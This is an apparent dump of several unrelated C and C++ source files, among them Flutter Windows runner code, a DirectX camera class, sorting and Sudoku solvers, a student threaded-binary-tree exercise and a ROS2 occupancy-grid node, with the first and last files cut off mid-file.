window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include<stdio.h>\r\nvoid merge(int arr[],int left,int mid,int right)\r\n{\r\n\tint i,j,k;\r\n\tint n1=mid-left+1;\r\n\tint n2=right-mid;\r\n\t\r\n\tint L[n1],R[n2];\r\n\t\r\n\tfor(i=0;i<n1;i++)\r\n\t   L[i]=arr[left+i];\r\n\tfor(j=0;j<n2;j++)\r\n\t   R[j]=arr[mid+1+j];\r\n\t   \r\n\t   i=0;\r\n\t   j=0;\r\n\t   k=left;\r\n\t   while(i<n1 && j<n2)\r\n\t   {\r\n\t   \t  if(L[i]<=R[j])\r\n\t   \t  {\r\n\t   \t  \tarr[k]=L[i];\r\n\t   \t  \ti++;\r\n\t   \t  \t\r\n\t\t\t } else{\r\n\t\t\t \t  arr[k]=R[j];\r\n\t\t\t \t  j++;\r\n\t\t\t \t  \r\n\t\t\t }\r\n\t\t\t k++;\r\n\t   }\r\n\t    while(i<n1){\r\n\t    \tarr[k]=L[i];\r\n\t    \ti++;\r\n\t    \tk++;\r\n\t    \t\r\n\t\t}\r\n\t\t\r\n\t\twhile(j<n2)\r\n\t\t{\r\n\t\t\tarr[k]=R[j];\r\n\t\t\tj++;\r\n\t\t\tk++;\r\n\t\t\t\r\n\t\t}\r\n\t\t\r\n}\r\n\r\nvoid mergesort(int arr[],int left,int right)\r\n{\r\n\tif(left<right){\r\n\t\tint mid=left+(right-left)/2;\r\n\t\t\r\n\t\tmergesort(arr,left,mid);\r\n\t\tmergesort(arr,mid+1,right);\r\n\t\t\r\n\t\tmerge(arr,left,mid,right);\r\n\t\t\r\n\t\t}\r\n\t}\r\n\t\r\nvoid printArray(int arr[],int size)\r\n{\r\n\tint i;\r\n\tfor(i=0;i<size;i++)\r\n\t   printf(\"%d\\n\",arr[i]);\r\n\tprintf(\"\\n\");\r\n\t\r\n}\r\n\r\nint main()\r\n{\r\n\tint arr[]={12,11,13,5,6,7};\r\n\tint arr_size=sizeof(arr)/sizeof(arr[0]);\r\n\t\r\n\tprintf(\"Given array is \\n\");\r\n\tprintArray(arr,arr_size);\r\n\t\r\n\tmergesort(arr,0,arr_size-1);\r\n\t\r\n\tprintf(\"\\nsorted array is \\n\");\r\n\tprintArray(arr,arr_size);\r\n\treturn 0;\r\n\t\r\n\t}\t\r\n\t\r\n",
    "//***************************************************************************************\n// Camera.h by Frank Luna (C) 2011 All Rights Reserved.\n//***************************************************************************************\n\n#include \"Camera.h\"\n\nusing namespace DirectX;\n\nCamera::Camera()\n{\n\tSetLens(0.25f*MathHelper::Pi, 1.0f, 1.0f, 1000.0f);\n}\n\nCamera::~Camera()\n{\n}\n\nXMVECTOR Camera::GetPosition()const\n{\n\treturn XMLoadFloat3(&mPosition);\n}\n\nXMFLOAT3 Camera::GetPosition3f()const\n{\n\treturn mPosition;\n}\n\nvoid Camera::SetPosition(float x, float y, float z)\n{\n\tmPosition = XMFLOAT3(x, y, z);\n\tmViewDirty = true;\n}\n\nvoid Camera::SetPosition(const XMFLOAT3& v)\n{\n\tmPosition = v;\n\tmViewDirty = true;\n}\n\nXMVECTOR Camera::GetRight()const\n{\n\treturn XMLoadFloat3(&mRight);\n}\n\nXMFLOAT3 Camera::GetRight3f()const\n{\n\treturn mRight;\n}\n\nXMVECTOR Camera::GetUp()const\n{\n\treturn XMLoadFloat3(&mUp);\n}\n\nXMFLOAT3 Camera::GetUp3f()const\n{\n\treturn mUp;\n}\n\nXMVECTOR Camera::GetLook()const\n{\n\treturn XMLoadFloat3(&mLook);\n}\n\nXMFLOAT3 Camera::GetLook3f()const\n{\n\treturn mLook;\n}\n\nfloat Camera::GetNearZ()const\n{\n\treturn mNearZ;\n}\n\nfloat Camera::GetFarZ()const\n{\n\treturn mFarZ;\n}\n\nfloat Camera::GetAspect()const\n{\n\treturn mAspect;\n}\n\nfloat Camera::GetFovY()const\n{\n\treturn mFovY;\n}\n\nfloat Camera::GetFovX()const\n{\n\tfloat halfWidth = 0.5f*GetNearWindowWidth();\n\treturn 2.0f*atan(halfWidth / mNearZ);\n}\n\nfloat Camera::GetNearWindowWidth()const\n{\n\treturn mAspect * mNearWindowHeight;\n}\n\nfloat Camera::GetNearWindowHeight()const\n{\n\treturn mNearWindowHeight;\n}\n\nfloat Camera::GetFarWindowWidth()const\n{\n\treturn mAspect * mFarWindowHeight;\n}\n\nfloat Camera::GetFarWindowHeight()const\n{\n\treturn mFarWindowHeight;\n}\n\nvoid Camera::SetLens(float fovY, float aspect, float zn, float zf)\n{\n\t// cache properties\n\tmFovY = fovY;\n\tmAspect = aspect;\n\tmNearZ = zn;\n\tmFarZ = zf;\n\n\tmNearWindowHeight = 2.0f * mNearZ * tanf( 0.5f*mFovY );\n\tmFarWindowHeight  = 2.0f * mFarZ * tanf( 0.5f*mFovY );\n\n\tXMMATRIX P = XMMatrixPerspectiveFovLH(mFovY, mAspect, mNearZ, mFarZ);\n\tXMStoreFloat4x4(&mProj, P);\n}\n\nvoid Camera::LookAt(FXMVECTOR pos, FXMVECTOR target, FXMVECTOR worldUp)\n{\n\tXMVECTOR L = XMVector3Normalize(XMVectorSubtract(target, pos));\n\tXMVECTOR R = XMVector3Normalize(XMVector3Cross(worldUp, L));\n\tXMVECTOR U = XMVector3Cross(L, R);\n\n\tXMStoreFloat3(&mPosition, pos);\n\tXMStoreFloat3(&mLook, L);\n\tXMStoreFloat3(&mRight, R);\n\tXMStoreFloat3(&mUp, U);\n\n\tmViewDirty = true;\n}\n\nvoid Camera::LookAt(const XMFLOAT3& pos, const XMFLOAT3& target, const XMFLOAT3& up)\n{\n\tXMVECTOR P = XMLoadFloat3(&pos);\n\tXMVECTOR T = XMLoadFloat3(&target);\n\tXMVECTOR U = XMLoadFloat3(&up);\n\n\tLookAt(P, T, U);\n\n\tmViewDirty = true;\n}\n\nXMMATRIX Camera::GetView()const\n{\n\tassert(!mViewDirty);\n\treturn XMLoadFloat4x4(&mView);\n}\n\nXMMATRIX Camera::GetProj()const\n{\n\treturn XMLoadFloat4x4(&mProj);\n}\n\n\nXMFLOAT4X4 Camera::GetView4x4f()const\n{\n\tassert(!mViewDirty);\n\treturn mView;\n}\n\nXMFLOAT4X4 Camera::GetProj4x4f()const\n{\n\treturn mProj;\n}\n\nvoid Camera::Strafe(float d)\n{\n\t// mPosition += d*mRight\n\tXMVECTOR s = XMVectorReplicate(d);\n\tXMVECTOR r = XMLoadFloat3(&mRight);\n\tXMVECTOR p = XMLoadFloat3(&mPosition);\n\tXMStoreFloat3(&mPosition, XMVectorMultiplyAdd(s, r, p));\n\n\tmViewDirty = true;\n}\n\nvoid Camera::Walk(float d)\n{\n\t// mPosition += d*mLook\n\tXMVECTOR s = XMVectorReplicate(d);\n\tXMVECTOR l = XMLoadFloat3(&mLook);\n\tXMVECTOR p = XMLoadFloat3(&mPosition);\n\tXMStoreFloat3(&mPosition, XMVectorMultiplyAdd(s, l, p));\n\n\tmViewDirty = true;\n}\n\nvoid Camera::Pitch(float angle)\n{\n\t// Rotate up and look vector about the right vector.\n\n\tXMMATRIX R = XMMatrixRotationAxis(XMLoadFloat3(&mRight), angle);\n\n\tXMStoreFloat3(&mUp,   XMVector3TransformNormal(XMLoadFloat3(&mUp), R));\n\tXMStoreFloat3(&mLook, XMVector3TransformNormal(XMLoadFloat3(&mLook), R));\n\n\tmViewDirty = true;\n}\n\nvoid Camera::RotateY(float angle)\n{\n\t// Rotate the basis vectors about the world y-axis.\n\n\tXMMATRIX R = XMMatrixRotationY(angle);\n\n\tXMStoreFloat3(&mRight,   XMVector3TransformNormal(XMLoadFloat3(&mRight), R));\n\tXMStoreFloat3(&mUp, XMVector3TransformNormal(XMLoadFloat3(&mUp), R));\n\tXMStoreFloat3(&mLook, XMVector3TransformNormal(XMLoadFloat3(&mLook), R));\n\n\tmViewDirty = true;\n}\n\nvoid Camera::UpdateViewMatrix()\n{\n\tif(mViewDirty)\n\t{\n\t\tXMVECTOR R = XMLoadFloat3(&mRight);\n\t\tXMVECTOR U = XMLoadFloat3(&mUp);\n\t\tXMVECTOR L = XMLoadFloat3(&mLook);\n\t\tXMVECTOR P = XMLoadFloat3(&mPosition);\n\n\t\t// Keep camera's axes orthogonal to each other and of unit length.\n\t\tL = XMVector3Normalize(L);\n\t\tU = XMVector3Normalize(XMVector3Cross(L, R));\n\n\t\t// U, L already ortho-normal, so no need to normalize cross product.\n\t\tR = XMVector3Cross(U, L);\n\n\t\t// Fill in the view matrix entries.\n\t\tfloat x = -XMVectorGetX(XMVector3Dot(P, R));\n\t\tfloat y = -XMVectorGetX(XMVector3Dot(P, U));\n\t\tfloat z = -XMVectorGetX(XMVector3Dot(P, L));\n\n\t\tXMStoreFloat3(&mRight, R);\n\t\tXMStoreFloat3(&mUp, U);\n\t\tXMStoreFloat3(&mLook, L);\n\n\t\tmView(0, 0) = mRight.x;\n\t\tmView(1, 0) = mRight.y;\n\t\tmView(2, 0) = mRight.z;\n\t\tmView(3, 0) = x;\n\n\t\t",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include<bits/stdc++.h>\r\nusing namespace std;\r\nclass node{\r\n\tpublic:\r\n\t\tint data;\r\n\t\tint lbit,rbit;\r\n\t\tnode*left,*right;\r\n};\r\nclass TBT\r\n{\r\n\tprivate:\r\n\t\tnode*root,*dummy;\r\n\tpublic;\r\n\tvoid create(int num);\r\n\tvoid insert (node*trav,node*temp);\r\n\tvoid preorder();\r\n\tvoid display();\r\nTBT()\r\n    {\r\n    root-NULL;\r\n\tdummy-NULL;\t\r\n\t}\t\r\n}*root,*dummy;\r\nvoid TBT::creatw(int num)\r\n{\r\n\tnode *trave,*temp;\r\n\ttemp=new node();\r\n\ttemp->data=num;\r\n\ttemp->lbit=0;\r\n\ttemp->rbit=0;\r\n\tif (root==NULL){\r\n\t\t\r\n\t\tdummy=new node;\r\n\t\tdummy->lbit=0;\r\n\t\tdummy->rbit=0;\r\n\t\tdummy->left=temp;\r\n\t\tdummy->right=dummy;\r\n\t\tdummy->left=dummy;\r\n\t\tdummy->right=dummy;\r\n\t\troot=temp;\r\n\t}\r\n\telse(\r\n\t\ttrav=root;\r\n\t\tinsert(trav,temp);\r\n\t)\r\n}\r\nvoid TBT::insert(node*trav,node*temp)\r\n{\r\n\tif(temp->data<trav->data)\r\n\t{\r\n\t\tif(trav->lbit=0)\r\n\t\t{\r\n\t\t\ttemp->left=trav->left;\r\n\t\t\ttemp->right=trav;\r\n            trav->left=temp;\r\n\t\t\ttrav->lbit=1;\r\n\r\n\t\t}\r\n\t\telse\r\n\t\t{\r\n\t\t\tinsert(trav->left,temp);\r\n\r\n\t\t}\r\n\t}\r\n\tif(temp->data>trav->data)\r\n\t{\r\n\t\tif(trav->rbit==0)\r\n\t\t{\r\n\t\t\ttemp->right=trav->rbit;\r\n\t\t\ttemp->left=trav;\r\n            trav->right=temp;\r\n\t\t\ttrav->rbit=1;\r\n\t\t}\r\n\t\telse{\r\n\t\t\tinsert(trav->right,temp);\r\n\t\t}\r\n\t}\r\n\t\r\n}\r\nvoid TBT ::preorder()\r\n{\r\n\t node *trav;\r\n\t trav=root;\r\n\t while (trav!=dummy)\r\n\t {\r\n\t\t/* code */\r\n\t\tcout<<trav->data<<endl;\r\n\t\tif (trav->bit==1)\r\n\t\t{\r\n\t\t\t/* code */\r\n\t\t\ttrav=trav->left;\r\n\r\n\t\t}else\r\n\t\t{\r\n\t\t\twhile (trav->bit==0 && trav->right=dummy)\r\n\t\t\t{\r\n\t\t\t\t/* code */\r\n\t\t\t\ttrav=trav->right;\r\n\r\n\t\t\t}\r\n\t\t\ttrav=trav->right;\r\n\r\n\t\t\t\r\n\t\t}\r\n\t\t\r\n\t }\r\n\t \r\n}\r\nvoid TBT::display()\r\n{\r\nint i,n,data;\r\ncout<<\"\\n enter the number of nodes  \\n\";\r\ncin>>n;\r\ncout<<\"\\n Enter the data In Nodes \\n\";\r\nfor(i=0;i<n;i++){\r\n\tcin>>data;\r\n\tcreate(data)\r\n}\r\ncout<<\"\\n Preorder: \\n\";\r\npreorder();\r\n}\r\nint main(){\r\n\tTBT T;\r\n\tT.display();\r\n\treturn 0;\r\n}\r\n",
    "#include<vector>\r\n#include<map>\r\n#include<iostream>\r\n\r\nstruct ListNode {\r\n\tint val;\r\n\tListNode *next;\r\n\tListNode() :val(0), next(nullptr) {}\r\n\tListNode(int x) :val(x), next(nullptr) {}\r\n\tListNode(int x, ListNode *next) :val(x), next(next) {}\r\n};\r\n\r\nclass Solution {\r\npublic:\r\n\r\npublic:\r\n\tListNode* mergeTwoLists(ListNode* list1, ListNode* list2) {\r\n\t\tstd::vector<int> vList1;\r\n\t\tstd::vector<int> vList2;\r\n\t\tstd::vector<int> vBool;// List1->0, List2->1\r\n\r\n\t\tListNode* listTmp1 = list1;\r\n\t\twhile (listTmp1)\r\n\t\t{\r\n\t\t\tvList1.push_back(listTmp1->val);\r\n\t\t\tlistTmp1 = listTmp1->next;\r\n\t\t}\r\n\r\n\t\tListNode* listTmp2 = list2;\r\n\t\twhile (listTmp2)\r\n\t\t{\r\n\t\t\tvList2.push_back(listTmp2->val);\r\n\t\t\tlistTmp2 = listTmp2->next;\r\n\t\t}\r\n\r\n\t\twhile (!vList1.empty() || !vList2.empty())\r\n\t\t{\r\n\t\t\tif (!vList1.empty() && !vList2.empty())\r\n\t\t\t{\r\n\t\t\t\tif (vList1[0] > vList2[0])\r\n\t\t\t\t{\r\n\t\t\t\t\tvList2.erase(vList2.begin());\r\n\t\t\t\t\tvBool.push_back(0);\r\n\t\t\t\t}\r\n\t\t\t\telse if (vList1[0] == vList2[0])\r\n\t\t\t\t{\r\n\t\t\t\t\tvList1.erase(vList1.begin());\r\n\t\t\t\t\tvList2.erase(vList2.begin());\r\n\t\t\t\t\tvBool.push_back(0);\r\n\t\t\t\t\tvBool.push_back(1);\r\n\t\t\t\t}\r\n\t\t\t\telse\r\n\t\t\t\t{\r\n\t\t\t\t\tvList1.erase(vList1.begin());\r\n\t\t\t\t\tvBool.push_back(1);\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t\telse if (vList1.empty())\r\n\t\t\t{\r\n\t\t\t\tvList2.erase(vList2.begin());\r\n\t\t\t\tvBool.push_back(0);\r\n\t\t\t}\r\n\t\t\telse\r\n\t\t\t{\r\n\t\t\t\tvList1.erase(vList1.begin());\r\n\t\t\t\tvBool.push_back(1);\r\n\t\t\t}\r\n\t\t}\r\n\r\n\t\tListNode* ListDummy = new ListNode(0, nullptr);\r\n\t\tListNode* ListRes = ListDummy;\r\n\t\tfor (int n = 0; n < vBool.size(); n++)\r\n\t\t{\r\n\t\t\tif (vBool[n])\r\n\t\t\t{\r\n\t\t\t\tListDummy->next = list1;\r\n\t\t\t\tListDummy = ListDummy->next;\r\n\t\t\t\tlist1 = list1->next;\r\n\t\t\t}\r\n\t\t\telse\r\n\t\t\t{\r\n\t\t\t\tListDummy->next = list2;\r\n\t\t\t\tListDummy = ListDummy->next;\r\n\t\t\t\tlist2 = list2->next;\r\n\t\t\t}\r\n\t\t}\r\n\t\t//ListNode* listRes = new ListNode(0, ListDummy);\r\n\t\treturn ListRes->next;\r\n\t}\r\n};\r\n\r\nint main()\r\n{\r\n\t//ListNode* list1 = new ListNode(1, nullptr);\r\n\t//list1->next = new ListNode(2);\r\n\t//list1->next->next = new ListNode(4);\r\n\r\n\t//ListNode* list2 = new ListNode(1);\r\n\t//list2->next = new ListNode(3);\r\n\t//list2->next->next = new ListNode(4);\r\n\r\n\tListNode* list1 = new ListNode();\r\n\tlist1 = nullptr;\r\n\tListNode* list2 = new ListNode(0, nullptr);\r\n\tSolution sol;\r\n\tListNode* listRes =  sol.mergeTwoLists(list1, list2);\r\n\tstd::cout << \"show listRes: \" << std::endl;\r\n\twhile (listRes)\r\n\t{\r\n\t\tstd::cout << listRes->val << std::endl;\r\n\t\tlistRes = listRes->next;\r\n\t}\r\n\treturn 0;\r\n}",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include <iostream>\n#include <math.h>\n#include \"sudoku.h\"\n\nSudoku::Sudoku() {\n  this->numRows = 9;\n  this->numCols = 9;\n  this->boxSideLen = 3;\n  this->isSolved = false;\n  this->board = new int*[numRows];\n\n  for (int i = 0; i < this->numRows; i++) {\n    this->board[i] = new int[numCols];\n  }\n\n  for (int i = 0; i < this->numRows; i++) {\n    for (int j = 0; j < this->numCols; j++) {\n      this->board[i][j] = 0;\n    }\n  }\n}\n\nSudoku::Sudoku(int board[9][9]) {\n  this->numRows = 9;\n  this->numCols = 9;\n  this->boxSideLen = 3;\n  this->isSolved = false;\n  this->board = new int*[numRows];\n\n  for (int i = 0; i < this->numRows; i++) {\n    this->board[i] = new int[numCols];\n  }\n\n  for (int i = 0; i < numRows; i++) {\n    for (int j = 0; j < numCols; j++) {\n      this->board[i][j] = board[i][j];\n    }\n  }\n}\n\nSudoku::~Sudoku() {\n  for (int i = 0; i < numRows; i++) {\n    delete [] board[i];\n  }\n  delete [] board;\n}\n\nvoid Sudoku::printBoard() {\n  if (!isSolved) {\n    std::cout << \"Original Sudoku: \" << std::endl;\n  }\n  else {\n    std::cout << \"Solved Sudoku: \" << std::endl; \n  }\n  for (int i = 0; i < numRows; i++) {\n    std::cout << \"| \";\n    for (int j = 0; j < numCols; j++) {\n      std::cout << board[i][j];\n      if (j < numCols - 1) {\n        std::cout << \" | \";\n      }\n    }\n    std::cout << \" |\" << std::endl;\n  }\n  std::cout << std::endl;\n}\n\nbool Sudoku::isSafe(int row, int col) {\n  int value = board[row][col];\n  for (int i = 0; i < numCols; i++) {\n    if (i != col && value == board[row][i]) return false;\n  }\n\n  for (int i = 0; i < numRows; i++) {\n    if (i != row && value == board[i][col]) return false;\n  }\n\n  int boxStartRow = row/3 * 3;\n  int boxStartCol = col/3 * 3;\n  for (int i = 0; i < numRows; i++) {\n    int currentRow = boxStartRow + (i / 3);\n    int currentCol = boxStartCol + (i % 3);\n\n    if (currentCol != col && currentRow != row && board[currentRow][currentCol] == value) return false;\n  }\n\n  return true;\n}\n\nbool Sudoku::solveRecurse(int row, int col) {\n  if (row == numRows - 1 && col == numCols) {\n    return true;\n  }\n\n  if (col == numCols) {\n    col = 0;\n    row ++;\n  }\n\n  if (board[row][col] != 0) return solveRecurse(row, col + 1);\n\n  for (int i = 1; i <= numRows; i++) {\n    this->board[row][col] = i;\n    if (isSafe(row, col)) {\n      if (solveRecurse(row, col+1)) return true;\n    }\n    this->board[row][col] = 0;\n  }\n\n  return false;\n}\n\nbool Sudoku::solve() {\n  isSolved = this->solveRecurse(0, 0);\n  return isSolved;\n}\n",
    "#include <iostream>\n#include \"database.h\"\n\nusing std::string;\nusing std::cout;\nusing std::endl;\nusing std::cin;\n\nArray* makeArray(Array* array)\n{\n    string array_type;\n    int size;\n    cout << \"value: type (int, double, string, array): \";\n    cin >> array_type;\n    cout << \"size: \";\n    cin >> size;\n\n\n    if (array_type == \"int\")\n    {\n        int* arr = new int[size];\n        for(int i = 0; i < size; i++)\n        {\n            int item;\n            cout << \"item[\" << i << \"]: \";\n            cin >> item;\n            *(arr + i) = item;\n        }\n        cout << endl;\n        array->size = size;\n        array->type = Type::INT;\n        array->items = arr;\n    }\n    else if (array_type == \"double\")\n    {\n        double* arr = new double[size];\n        for(int i = 0; i < size; i++)\n        {\n            double item;\n            cout << \"item[\" << i << \"]: \";\n            cin >> item;\n            *(arr + i) = item;\n        }\n        cout << endl;\n        array->size = size;\n        array->type = Type::DOUBLE;\n        array->items = arr;\n    }\n    else if (array_type == \"string\")\n    {\n        cin.ignore();\n        string* arr = new string[size];\n        for(int i = 0; i < size; i++)\n        {\n            string item;\n            cout << \"item[\" << i << \"]: \";\n            getline(cin, item);\n            *(arr + i) = item;\n        }\n        cout << endl;\n        array->size = size;\n        array->type = Type::STRING;\n        array->items = arr;\n    }\n    else if (array_type == \"array\")\n    {\n        Array* arr = new Array[size];\n        array->size = size;\n        array->type = Type::ARRAY;\n        for(int i = 0; i < size; i++)\n        {\n            Array* item = new Array;\n            cout << \"item[\" << i << \"]: \";\n            item = makeArray(item);\n            *(arr + i) = *item;\n        }\n        array->items = arr;\n    }\n    return array;\n}\n\n// ** \uc911\uc694 ** \uc218\uc815\ud574\uc57c\ud560 \ubd80\ubd84\n// \uc774\uc911\ubc30\uc5f4 \ucd9c\ub825\ud560 \ub54c \uccab\ubc88\uc9f8 \ubc30\uc5f4\uc758 \uac12\uc774 \ub9c8\uc9c0\ub9c9 \ubc30\uc5f4\uc758 \uac12\uc73c\ub85c \ucd9c\ub825\ub41c\ub2e4\n// \uccab\ubc88\uc9f8 \ubc30\uc5f4\uc758 \uac12\uc774 \uc81c\ub300\ub85c \ucd9c\ub825\ub418\uac8c\ub054 \uc218\uc815\ud574\uc57c\ud568\n\nint main()\n{\n    Database db;\n    init(db);\n    int i = 0;\n\n    while(true)\n    {\n        string answer;\n        cout << \"command (list, add, get, del, exit): \";\n        cin >> answer;\n\n        if (answer == \"exit\")\n        {\n            destroy(db);\n            break;\n        }\n\n        else if (answer == \"add\")\n        {\n            Entry* en = new Entry;\n            string key, type;\n            cout << \"key: \";\n            cin >> key;\n\n            cout << \"type (int, double, string, array): \";\n            cin >> type;\n\n            while (true)\n            {   \n                if (type == \"int\")\n                {\n                    int* i_value = new int;\n                    cout << \"value: \";\n                    cin >> *i_value;\n                    cout << endl;\n                    en = create(Type::INT, key, i_value);\n                    break;\n                }\n                else if (type == \"double\")\n                {\n                    double* d_value = new double;\n                    cout << \"value: \";\n                    cin >> *d_value;\n                    cout << endl;\n                    en = create(Type::DOUBLE, key, d_value);\n                    break;\n                }\n                else if (type == \"string\")\n                {\n                    string* s_value = new string;\n                    cout << \"value: \";\n                    cin.ignore();\n                    getline(cin, *s_value);\n                    cout << endl;\n                    en = create(Type::STRING, key, s_value);\n                    break;\n                }\n                else if (type == \"array\")\n                {\n                    Array* reArray = new Array;\n                    reArray = makeArray(reArray);\n                    en = create(Type::ARRAY, key, reArray);\n                    break;\n                }\n                else\n                {\n                    cout << endl;\n                    cout << \"Error: no such your command :(\" << endl;\n                    cout << endl;\n                }\n            }\n\n            add(db, en);\n        }\n\n        else if (answer == \"list\")\n        {\n            showAll(db);\n            cout << endl;\n        }\n\n        else if (answer == \"get\")\n        {\n            Entry* getting;\n            string whatGet;\n            cout << \"key: \";\n            cin >> whatGet;\n            getting = get(db, whatGet);\n\n            while (true)\n            {\n                if (getting->type == INT)\n                {\n                    cout << getting->key << \": \" << *(int *)getting->value << endl;\n                    break;\n                }\n\n                else if (getting->type == STRING)\n                {\n                    cout << getting->key << \": \\\"\" << *(string *)getting->value << \"\\\"\" <<  endl;\n                    break;\n                }\n                \n                else if (getting->type == DOUBLE)\n                {\n                    cout << getting->key << \": \" << *(double *)getting->value << endl;\n                    break;\n    ",
    "#include \"rclcpp/rclcpp.hpp\"\n#include \"sensor_msgs/msg/point_cloud2.hpp\"\n#include \"nav_msgs/msg/occupancy_grid.hpp\"\n#include \"pcl_conversions/pcl_conversions.h\"\n#include \"pcl/point_cloud.h\"\n#include \"pcl/point_types.h\"\n#include <pcl/filters/voxel_grid.h>\n#include <vector>\n#include <iostream>\n\nclass OccupancyGridMapGenerator : public rclcpp::Node\n{\npublic:\n    OccupancyGridMapGenerator() : Node(\"occupancy_grid_map_generator\")\n    {   \n\n        // Declare parameters with default values\n        declare_parameters();\n\n        // Get parameter values\n        get_parameters();\n\n        auto qos = rclcpp::QoS(rclcpp::KeepLast(1)).reliable(); // \uc13c\uc11c \ub370\uc774\ud130\uc5d0 \ub300\ud55c \uc2e0\ub8b0\ud560 \uc218 \uc788\ub294 QoS \uc124\uc815\n\n        subscription_ = this->create_subscription<sensor_msgs::msg::PointCloud2>(\n            \"/filtered_points\", qos,\n            std::bind(&OccupancyGridMapGenerator::pointcloud_callback, this, std::placeholders::_1));\n\n        publisher_ = this->create_publisher<nav_msgs::msg::OccupancyGrid>(\"occupancy_grid_topic\", 10);\n    }\n\nprivate:\n\n    float min_x_; // Minimum 